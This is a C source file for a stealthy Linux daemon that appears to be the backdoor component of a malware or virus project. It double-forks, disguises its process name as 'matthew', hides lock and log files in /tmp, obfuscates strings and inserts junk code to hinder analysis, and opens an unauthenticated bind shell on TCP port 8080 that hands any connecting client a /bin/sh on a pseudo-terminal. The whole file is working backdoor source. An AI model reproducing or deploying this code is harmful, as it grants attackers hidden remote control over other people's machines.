#include <sys/file.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/epoll.h>
#include <signal.h>
#include <limits.h>
#include <sys/signalfd.h>
#include <errno.h>
#include <pty.h>

#include "daemon.h"
#include "utils.h"
#include "death.h"
#include "signale.h"
#include "syscall.h"

#define CLOSE_END 0
#define NO_CLOSE_END 1
#define MAX_CLIENTS 2

char __attribute__((section(".text#"))) **g_env;

void logger(const char *msg);

static int my_htons(int port)
{
	return ((port & 0xff) << 8) | ((port & 0xff00) >> 8);
}

static int setnonblocking(int fd)
{
	int flags = fcntl(fd, F_GETFL, 0);
	if (flags == -1) {
		return -1;
	}

	return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

static int setblocking(int fd)
{
	int flags = fcntl(fd, F_GETFL, 0);
	if (flags == -1) {
		return -1;
	}

	return fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
}

static int create_server(void)
{
	int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0);
	if (fd == -1) {
		return -1;
	} JUNK;

	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port = my_htons(8080),
		.sin_addr.s_addr = INADDR_ANY
	};

	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int))) {
		close(fd);
		return -1;
	} JUNK;

	if (bind(fd, &addr, sizeof(addr)) < 0) {
		close(fd);
		return -1;
	} JUNK;

	if (listen(fd, 0) < 0) {
		close(fd);
		return -1;
	}

	return fd;
}

static int accept_client(int fd)
{
	struct sockaddr_in addr;
	socklen_t addr_len = sizeof(addr); JUNK;

	//int client_fd = accept(fd, &addr, &addr_len);
	int client_fd = accept4(fd, (struct sockaddr *)&addr, &addr_len, SOCK_NONBLOCK | SOCK_CLOEXEC);
	if (client_fd == -1) {
		return -1;
	}

	return client_fd;
}

/* Commands */

int hello(param_t *command)
{
	(void)command;
	logger(STR("hello\n"));
	return 0;
}

static int disable_echo(int slave_fd) {
	struct termios tty;

	if (ioctl(slave_fd, TCGETS, &tty) == -1) {
		logger(STR("ioctl TGETATTR failed\n"));
		return -1;
	} JUNK;

	//tty.c_lflag &= ~ECHO;
	// cfmakeraw disables ICANON, ECHO, ISIG, etc, disables input/output processing
	tty.c_iflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);
	tty.c_oflag &= ~(OPOST);
	tty.c_lflag &= ~(ECHO | ICANON | IEXTEN | ISIG);
	tty.c_cflag &= ~(CSIZE | PARENB);
	tty.c_cflag |= CS8;

	return ioctl(slave_fd, TCSETS, &tty);
}

int exec_shell2(param_t *command)
{
	char *argv[] = {STR("/bin/sh"), NULL}; //, STR("-i"), STR("+m"), NULL};
	//
	//char *argv[] = {STR("/bin/bash"), STR("--noprofile"), STR("--norc"), NULL};
	int slave_fd = -1;
	client_t *client = command->client;
	int epoll_fd = client->master_ev.epoll_fd;

	if (add_event(epoll_fd, &client->master_ev, EPOLLIN) == -1) {
		logger(STR("add_event failed\n"));
		return -1;
	} JUNK;
	
	pid_t pid = fork();
	if (pid == -1) {
		logger(STR("fork failed\n"));
		return -1;
	} else if (pid == 0) {

		slave_fd = open(client->pty_name, O_RDWR | O_CLOEXEC);
		if (slave_fd == -1) {
			logger(STR("open slave failed\n"));
			exit(1);
		} JUNK;

		if (disable_echo(slave_fd) == -1) {
			logger(STR("disable_echo failed\n"));
			exit(1);
		}

		if (prctl(PR_SET_PDEATHSIG, SIGKILL) == -1) {
			logger(STR("prctl failed\n"));
			exit(1);
		}

		if (setsid() == -1) {
			logger(STR("setsid failed\n"));
			exit(1);
		} JUNK;

		if (ioctl(slave_fd, TIOCSCTTY, NULL) == -1) {
			logger(STR("slave_fd TIOCSCTTY (set controlling terminal) failed\n"));
			exit(1);
		} JUNK;

		dup2(slave_fd, 0);
		dup2(slave_fd, 1);
		dup2(slave_fd, 2);

		execve(argv[0], argv, g_env);
		exit(1);
	}

	client->shell_active = true;

	return 0;
}

int unknown(param_t *command)
{
	(void)command;
	logger(STR("unknown command\n"));
	return 0;
}

int (*get_command(const char *cmd))(param_t *)
{

	command_t commands[] = {
		{STR("hello"), hello},
		{STR("shell"), exec_shell2},
		{NULL, unknown}
	}; JUNK;

	for (int i = 0; commands[i].name != NULL; i++) {
		if (ft_strcmp(commands[i].name, cmd) == 0) {
			return commands[i].func;
		}
	}

	return unknown;
}

/* Main epoll loop */
/* pretty sure EPOLLRHUP and EPOLLHUP implicitly added */
int add_event(int epoll_fd, event_t *event, uint32_t events)
{
	struct epoll_event ev;
	ev.events = events | EPOLLRDHUP | EPOLLHUP;
	ev.data.ptr = event;

	return epoll_ctl(epoll_fd, EPOLL_CTL_ADD, event->fd, &ev);
}

int remove_event(int epoll_fd, event_t *event)
{
	return epoll_ctl(epoll_fd, EPOLL_CTL_DEL, event->fd, NULL);
}

void fill_event(event_t *event, int fd, void (*handle_event)(event_t *, uint32_t), void *context, int epoll_fd)
{
	event->fd = fd;
	event->epoll_fd = epoll_fd;
	event->handle_event = handle_event;
	event->context = context;
}

void signal_event(event_t *self, uint32_t events) {
	if (events & EPOLLRDHUP || events & EPOLLHUP) {
		logger(STR("signal event: EPOLLRDHUP or EPOLLHUP\n"));
		return;
	} else if (events & EPOLLIN) {
		//signal_t *signal = (signal_t *)self->context;
		struct signalfd_siginfo siginfo;
		ssize_t s = read(self->fd, &siginfo, sizeof(siginfo));
		if (s != sizeof(siginfo)) {
			logger(STR("read failed\n"));
			return;
		} JUNK;

		if (siginfo.ssi_signo == SIGCHLD) {
			siginfo_t info;
			pid_t pid = waitid(P_ALL, 0, &info, WEXITED | WNOHANG, NULL);
			if (pid == 0) {
				if (info.si_code == CLD_EXITED) {
					logger(STR("child process terminated\n"));
				} else if (info.si_code == CLD_KILLED) {
					logger(STR("child process killed\n"));
				} else if (info.si_code == CLD_DUMPED) {
					logger(STR("child process dumped\n"));
				} else if (info.si_code == CLD_STOPPED) {
					logger(STR("child process stopped\n"));
				} else if (info.si_code == CLD_CONTINUED) {
					logger(STR("child process continued\n"));
				}
			}

		}
	}
}

void client_event(event_t *self, uint32_t events) {
	client_t *client = (client_t *)self->context;

	if (events & EPOLLRDHUP || events & EPOLLHUP) {
		logger(STR("client event: EPOLLRDHUP or EPOLLHUP\n"));
		epoll_ctl(self->epoll_fd, EPOLL_CTL_DEL, self->fd, NULL);
		close(self->fd);
		if (client->shell_active == true) {
			epoll_ctl(self->epoll_fd, EPOLL_CTL_DEL, client->master_ev.fd, NULL);
			close(client->master_ev.fd);
		}

		ft_memset(client, 0, sizeof(client_t));

		return;
	} else if (events & EPOLLIN) {

		char buf[256];

		buf[0] = '\0';

		//check if fd is blocking
		int flags = fcntl(self->fd, F_GETFL, 0);
		if (flags == -1) {
			logger(STR("fcntl failed\n"));
			return;
		}
		if (flags & O_NONBLOCK) {
			logger(STR("fd is non-blocking\n"));
		} else {
			logger(STR("fd is blocking\n"));
			return;
		}

		/* prompt */

		ssize_t ret = read(self->fd, buf, sizeof(buf) - 1);

		if (ret == -1) {
			logger(STR("read failed\n"));
			return;

		} else if (ret == 0) {
			logger(STR("client disconnected\n"));
			epoll_ctl(self->epoll_fd, EPOLL_CTL_DEL, self->fd, NULL);
			close(self->fd);
			return;
		} JUNK;

		if (client->shell_active == true && ret > 0) {
			logger(STR("client shell active, writing to master\n"));
			write(client->master_ev.fd, buf, ret);
			return;
		}

		if (buf[ret - 1] == '\n')
			buf[ret - 1] = '\0';
		buf[ret] = '\0';

		param_t command = {
			.client = (client_t *)self->context,
			.envp = g_env
		};

		int (*func)(param_t *) = get_command(buf);
		if (func != NULL) {
			func(&command);
		}

	}
}

static int create_pts(char *cpty_name) {
	int master_fd = open(STR("/dev/ptmx"), O_RDWR | O_NOCTTY | O_CLOEXEC);
	if (master_fd == -1) {
		logger(STR("open /dev/ptmx failed\n"));
		return -1;
	} JUNK;

	int unlock = 0;
	if (ioctl(master_fd, TIOCSPTLCK, &unlock) == -1) {
		logger(STR("ioctl TIOCSPTLCK failed\n"));
		close(master_fd);
		return -1;
	} JUNK;

	int pty_num;
	if (ioctl(master_fd, TIOCGPTN, &pty_num) == -1) {
		logger(STR("ioctl TIOCGPTN failed\n"));
		close(master_fd);
		return -1;
	} JUNK;

	char pty_name[32];
	char *ptr = pty_name;
	ptr = ft_stpncpy(ptr, STR("/dev/pts/"), 32 - (ptr - pty_name));
	itoa(pty_num, ptr);

	/* cpty points to client->pty_name */
	ft_strncpy(cpty_name, pty_name, 32);

	return master_fd;
}

void master_event(event_t *self, uint32_t events) {
	if (events & EPOLLRDHUP || events & EPOLLHUP) {
		logger(STR("master event: EPOLLRDHUP or EPOLLHUP\n"));
		epoll_ctl(self->epoll_fd, EPOLL_CTL_DEL, self->fd, NULL);
		client_t *client = (client_t *)self->context;
		client->shell_active = false;

		return;
	} else if (events & EPOLLIN) {

		logger(STR("master event: EPOLLIN\n"));

		client_t *client = (client_t *)self->context;
		char buf[256];

		ssize_t ret = read(self->fd, buf, sizeof(buf) - 1);
		if (ret == -1) {
			logger(STR("read failed\n"));
			return;
		} JUNK;

		if (ret == 0) {
			logger(STR("master disconnected\n"));
			epoll_ctl(self->epoll_fd, EPOLL_CTL_DEL, self->fd, NULL);
			close(self->fd);
			return;
		} JUNK;

		buf[ret] = '\0';
		write(client->client_ev.fd, buf, ret);
	}
}

void server_event(event_t *self, uint32_t events)
{
	if (events & EPOLLRDHUP || events & EPOLLHUP) {
		logger(STR("server event: EPOLLRDHUP or EPOLLHUP\n"));
		exit(1); // server socket closed, exit the daemon

	} else if (events & EPOLLIN) {
		server_t *server = (server_t *)self->context;
		int client_fd = accept_client(self->fd);
		if (client_fd == -1) {
			logger(STR("accept failed\n"));
			return;
		} JUNK;

		client_t *client = NULL;
		for (int i = 0; i < MAX_CLIENTS; i++) {
			if (server->client[i].client_ev.fd == 0) {
				client = &server->client[i];
				break;
			}
		}

		if (client == NULL) {
			logger(STR("too many clients\n"));
			close(client_fd);
			return;
		} JUNK;

		fill_event(&client->client_ev, client_fd, client_event, client, self->epoll_fd);

		if (add_event(self->epoll_fd, &client->client_ev, EPOLLIN) == -1) {
			logger(STR("add_event failed\n"));
			return;
		} JUNK;

		int master_fd = create_pts(client->pty_name);
		if (master_fd == -1) {
			logger(STR("create_pts failed\n"));
			return;
		} JUNK;

		fill_event(&client->master_ev, master_fd, master_event, client, self->epoll_fd);
	}
}


static int init_epoll(int sfd, server_t *server, signal_t *signal) {
	int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
	if (epoll_fd == -1) {
		logger(STR("epoll_create1 failed\n"));
		return -1;
	} JUNK;

	fill_event(&server->event, sfd, server_event, server, epoll_fd);
	if (add_event(epoll_fd, &server->event, EPOLLIN) == -1) {
		logger(STR("add_event failed\n"));
		close(epoll_fd);
		return -1;
	} JUNK;

	kernel_sigset_t mask, oldmask;
	ft_sigemptyset(&mask);
	ft_sigaddset(&mask, SIGCHLD);
	if (sigprocmask(SIG_BLOCK, &mask, &oldmask, _NSIG/8) == -1) {
		logger(STR("sigprocmask failed\n"));
		close(epoll_fd);
		return -1;
	} JUNK;

	int signal_fd = signalfd4(-1, &mask, _NSIG/8, SFD_NONBLOCK | SFD_CLOEXEC);
	if (signal_fd == -1) {
		logger(STR("signalfd failed\n"));
		close(epoll_fd);
		return -1;
	} JUNK;

	fill_event(&signal->event, signal_fd, signal_event, signal, epoll_fd);
	if (add_event(epoll_fd, &server->signal->event, EPOLLIN) == -1) {
		logger(STR("add_event failed\n"));
		close(signal_fd);
		close(epoll_fd);
		return -1;
	} JUNK;

	return epoll_fd;
}

static void epoller2(int sfd, char **envp) {

	//char buf[256];
	//struct epoll_event events[MAX_CLIENTS * 2 + NB_SERVER + NB_SIGNAL];
	server_t server;
	signal_t signal;
	client_t client[MAX_CLIENTS];
	struct epoll_event events[MAX_CLIENTS * 2 + NB_SERVER + NB_SIGNAL];

	ft_memset(&server, 0, sizeof(server));
	ft_memset(&signal, 0, sizeof(signal));
	ft_memset(client, 0, sizeof(client));

	g_env = envp;

	server.client = client;
	server.signal = &signal;

	int epoll_fd = init_epoll(sfd, &server, &signal);
	if (epoll_fd == -1) {
		logger(STR("init_epoll failed\n"));
		return;
	} JUNK;

	while (1) {
		int n = epoll_wait(epoll_fd, events, sizeof(events) / sizeof(events[0]), -1);
		if (n == -1) {
			if (g_errno == EINTR) {
				logger(STR("epoll_wait interrupted by signal, retrying\n"));
				continue; // interrupted by a signal, retry
			}
			logger(STR("epoll_wait failed\n"));
			break;
		}

		for (int i = 0; i < n; i++) {
			event_t *event = (event_t *)events[i].data.ptr;
			if (event->handle_event) {
				event->handle_event(event, events[i].events);
			} else {
				logger(STR("event handler not set LOGIC ERROR\n"));
			}
		}
	}
}

static int lock(int *lock_fd, int close_end)
{
	*lock_fd = open(STR("/tmp/.warlock"), O_CREAT | O_RDWR, 0644);

	if (*lock_fd == -1) {
		return 1;
	}

	if (flock(*lock_fd, LOCK_EX | LOCK_NB) < 0) {
		logger(STR("already locked\n"));
		close(*lock_fd);
		return 1;
	} else {
		if (close_end == NO_CLOSE_END) {
			logger(STR("locked\n"));
		}
	}

	if (close_end == CLOSE_END) {
		//flock(*lock_fd, LOCK_UN);
		close(*lock_fd);
	}
	return 0;
}

static int unlock(int *lock_fd)
{
	//lock_fd = open(STR("/tmp/.warlock"), O_RDONLY);

	if (*lock_fd == -1) {
		return 1;
	}
	else if (flock(*lock_fd, LOCK_UN) < 0) {

		logger(STR("unlock failed\n"));
		close(*lock_fd);
		return 1;
	} else {
		logger(STR("unlocked\n"));
	}

	close(*lock_fd);
	return 0;
}

void run(int *lock_fd, char **envp)
{
	//signal_init();
	JUNK;

	int server_fd = create_server();
	if (server_fd == -1) {
		return;
	}

	//poller(server_fd, envp);
	epoller2(server_fd, envp);

	close(server_fd);

	unlock(lock_fd);
}

static int attach_to_devnull(void)
{
	int fd = open(STR("/dev/null"), O_RDONLY);
	if (fd == -1) {
		return -1;
	}

	if (dup2(fd, STDIN_FILENO) < 0) {
		return -1;
	} JUNK;

	close(fd);

	fd = open(STR("/dev/null"), O_WRONLY);
	if (fd == -1) {
		return -1;
	}

	if (dup2(fd, STDOUT_FILENO) < 0) {
		return -1;
	}
	if (dup2(fd, STDERR_FILENO) < 0) {
		return -1;
	}

	close(fd);
	return 0;
}

int	daemonize(char **envp)
{
	/* check if already locked, 
	 * if not locked: doesnt lock but instead continues 
	 * else returns 0 */

	int lock_fd = -1;
	if (lock(&lock_fd, CLOSE_END) == 1) {
		return 0;
	}

	pid_t	pid;

	pid = fork();

	if (pid < 0)
		return -1;
	if (pid > 0)
		return 0;

	if (setsid() == -1) {
		logger(STR("setsid failed\n"));
		return -1;
	} JUNK;

	pid = fork();
	if (pid < 0)
		return -1;
	if (pid > 0)
		exit(0);

	char name[16] = "matthew";
	prctl(PR_SET_NAME, name);
	
	//close_fds();

	if (attach_to_devnull() == -1) {
		return -1;
	}

	chdir(STR("/"));
	umask(0);


	/* lock the file (.warlock) at this point */
	if (lock(&lock_fd, NO_CLOSE_END) == 1) {
		write(1, STR("already locked\n"), 15);
		return 0;
	}

	run(&lock_fd, envp);
	return 0;
}

#ifdef LOGGER
void logger(const char *msg)
{
	int fd = open(STR("/tmp/.daemon"), O_WRONLY | O_CREAT | O_APPEND, 0644);
	if (fd == -1) {
		return;
	}

	write(fd, msg, ft_strlen(msg));
	close(fd);
}
#else
void logger(const char *msg)
{
	(void)msg;
}
#endif
